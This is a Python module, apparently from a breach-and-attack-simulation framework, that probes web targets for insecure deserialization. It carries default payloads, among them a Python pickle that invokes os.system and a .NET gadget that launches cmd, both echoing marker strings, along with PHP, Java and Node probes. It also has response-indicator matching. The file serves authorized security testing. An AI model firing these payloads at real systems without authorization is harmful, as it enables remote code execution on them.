"""Insecure Deserialization testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid, base64
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_DESER_PAYLOADS = [
    'O:8:"stdClass":0:{}',  # PHP
    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',  # Java (base64)
    '{"__proto__":{"polluted":true}}',  # Node.js
    'cos\nsystem\n(S\'echo BAS_DESER_TEST\'\ntR.',  # Python pickle
    'TzoxOiJhIjoxOntzOjE6ImIiO3M6NDoiY29kZSI7fQ==',  # PHP serialized b64
    '{"$type":"System.Diagnostics.Process","StartInfo":{"FileName":"cmd","Arguments":"/c echo BAS_DESER"}}',  # .NET
]

class DeserializationModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="deserialization", description="Insecure deserialization testing",
            category="deserialization", mitre_technique_ids=["T1190"],
            mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.STANDARD, owasp_category="A08:2021 - Software and Data Integrity Failures",
            cwe_ids=["CWE-502"], tags=["deserialization", "rce"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            p = await self._payload_db.get_payloads("deserialization", limit=50)
            if p: return p
        return DEFAULT_DESER_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        for p in payloads:
            for ct in ["application/x-www-form-urlencoded", "application/json", "application/x-java-serialized-object"]:
                requests.append(AttackRequest(request_id=f"deser-{uuid.uuid4().hex[:8]}", target=target,
                    method="POST", path=options.get("path", "/"), body=p, content_type=ct,
                    headers={"X-BAS-Payload": p[:50]}))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text.lower()
        indicators = [("bas_deser", "critical"), ("classnotfoundexception", "high"), ("unserialize()", "high"),
            ("java.io.objectinputstream", "high"), ("__wakeup", "medium"), ("pickle", "medium")]
        for ind, sev in indicators:
            if ind in body:
                return ModuleResult(module_name="deserialization", target=request.target,
                    status=VulnStatus.VULNERABLE if sev == "critical" else VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms, evidence=f"Deserialization indicator: {ind}",
                    severity=sev, mitre_technique_id="T1190")
        return ModuleResult(module_name="deserialization", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
